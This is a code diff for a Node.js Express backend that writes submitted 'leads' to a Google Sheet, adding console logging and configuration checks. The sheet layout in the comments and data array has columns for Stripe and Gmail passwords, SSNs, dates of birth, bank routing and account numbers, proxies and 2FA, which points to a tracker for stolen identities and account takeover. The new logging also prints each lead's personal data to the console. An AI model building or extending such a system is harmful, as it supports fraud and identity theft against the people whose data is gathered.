@@ -4,7 +4,6 @@ const cors = require('cors');
 const path = require('path');
 const multer = require('multer');
 const { google } = require('googleapis');
-const fs = require('fs');
 
 const app = express();
 const PORT = process.env.PORT || 8080;
@@ -14,63 +13,101 @@ const GOOGLE_SHEET_ID = process.env.GOOGLE_SHEET_ID;
 
 // Initialize Google Sheets API
 let sheets;
+console.log('🔍 Checking environment variables...');
+console.log('GOOGLE_SHEET_ID:', process.env.GOOGLE_SHEET_ID ? 'SET' : 'MISSING');
+console.log('GOOGLE_SERVICE_ACCOUNT_JSON:', process.env.GOOGLE_SERVICE_ACCOUNT_JSON ? 'SET' : 'MISSING');
+
 try {
   if (!process.env.GOOGLE_SERVICE_ACCOUNT_JSON) {
     throw new Error('GOOGLE_SERVICE_ACCOUNT_JSON environment variable is required');
   }
   
+  if (!process.env.GOOGLE_SHEET_ID) {
+    throw new Error('GOOGLE_SHEET_ID environment variable is required');
+  }
+  
+  console.log('🔄 Parsing Google Service Account JSON...');
   const credentials = JSON.parse(process.env.GOOGLE_SERVICE_ACCOUNT_JSON);
   console.log('✅ Using Google credentials from environment variable');
+  console.log('📧 Service account email:', credentials.client_email);
   
   const auth = new google.auth.GoogleAuth({
     credentials,
     scopes: ['https://www.googleapis.com/auth/spreadsheets']
   });
+  
   sheets = google.sheets({ version: 'v4', auth });
   console.log('✅ Google Sheets API initialized successfully');
+  console.log('📋 Target Sheet ID:', process.env.GOOGLE_SHEET_ID);
 } catch (error) {
   console.error('❌ Failed to initialize Google Sheets API:', error.message);
+  console.error('❌ Full error:', error);
+  sheets = null;
 }
 
 
 
 // Google Sheets helper function
 async function saveToGoogleSheets(leadData) {
-  if (!sheets || !GOOGLE_SHEET_ID) {
-    throw new Error('Google Sheets not configured');
+  console.log('📝 Starting Google Sheets save process...');
+  console.log('📝 Lead data:', leadData);
+  
+  if (!sheets) {
+    console.error('❌ Google Sheets API not initialized');
+    throw new Error('Google Sheets API not initialized');
+  }
+  
+  if (!GOOGLE_SHEET_ID) {
+    console.error('❌ Google Sheet ID not configured');
+    throw new Error('Google Sheet ID not configured');
   }
 
-  // Map to your existing column structure:
-  // A: FULL NAME, B: STRIPE, C: STRIPE PASS., D: EMAIL, E: PHONE, F: WHATSAPP, 
-  // G: ADDRESS, H: DATE OF BIRTH, I: SSN, J: GMAIL, K: GMAIL PASS., L: ROUTING #, 
-  // M: ACC #, N: APPLICATION ID, O: SUBMISSION DATE, P: STATUS, Q: PROXY, R: 2FA
-  const values = [[
-    leadData.fullName,     // A: FULL NAME
-    '',                    // B: STRIPE (empty)
-    '',                    // C: STRIPE PASS. (empty)
-    leadData.email,        // D: EMAIL
-    leadData.phone,        // E: PHONE
-    leadData.whatsapp,     // F: WHATSAPP
-    leadData.address,      // G: ADDRESS
-    '',                    // H: DATE OF BIRTH (empty)
-    '',                    // I: SSN (empty)
-    '',                    // J: GMAIL (empty)
-    '',                    // K: GMAIL PASS. (empty)
-    '',                    // L: ROUTING # (empty)
-    '',                    // M: ACC # (empty)
-    leadData.applicationId, // N: APPLICATION ID
-    new Date().toISOString(), // O: SUBMISSION DATE
-    'New Lead',            // P: STATUS
-    '',                    // Q: PROXY (empty)
-    ''                     // R: 2FA (empty)
-  ]];
+  try {
+    // Map to your existing column structure:
+    // A: FULL NAME, B: STRIPE, C: STRIPE PASS., D: EMAIL, E: PHONE, F: WHATSAPP, 
+    // G: ADDRESS, H: DATE OF BIRTH, I: SSN, J: GMAIL, K: GMAIL PASS., L: ROUTING #, 
+    // M: ACC #, N: APPLICATION ID, O: SUBMISSION DATE, P: STATUS, Q: PROXY, R: 2FA
+    const values = [[
+      leadData.fullName,     // A: FULL NAME
+      '',                    // B: STRIPE (empty)
+      '',                    // C: STRIPE PASS. (empty)
+      leadData.email,        // D: EMAIL
+      leadData.phone,        // E: PHONE
+      leadData.whatsapp,     // F: WHATSAPP
+      leadData.address,      // G: ADDRESS
+      '',                    // H: DATE OF BIRTH (empty)
+      '',                    // I: SSN (empty)
+      '',                    // J: GMAIL (empty)
+      '',                    // K: GMAIL PASS. (empty)
+      '',                    // L: ROUTING # (empty)
+      '',                    // M: ACC # (empty)
+      leadData.applicationId, // N: APPLICATION ID
+      new Date().toISOString(), // O: SUBMISSION DATE
+      'New Lead',            // P: STATUS
+      '',                    // Q: PROXY (empty)
+      ''                     // R: 2FA (empty)
+    ]];
 
-  await sheets.spreadsheets.values.append({
-    spreadsheetId: GOOGLE_SHEET_ID,
-    range: 'A:R',
-    valueInputOption: 'RAW',
-    resource: { values }
-  });
+    console.log('📝 Data to append:', values);
+    console.log('📋 Target Sheet ID:', GOOGLE_SHEET_ID);
+    
+    const response = await sheets.spreadsheets.values.append({
+      spreadsheetId: GOOGLE_SHEET_ID,
+      range: 'A1',
+      valueInputOption: 'RAW',
+      insertDataOption: 'INSERT_ROWS',
+      resource: { values }
+    });
+    
+    console.log('✅ Successfully saved to Google Sheets!');
+    console.log('📊 Response:', response.data);
+    return response.data;
+    
+  } catch (error) {
+    console.error('❌ Failed to save to Google Sheets:', error.message);
+    console.error('❌ Full error:', error);
+    throw error;
+  }
 }
 
 // Configure multer for form data handling
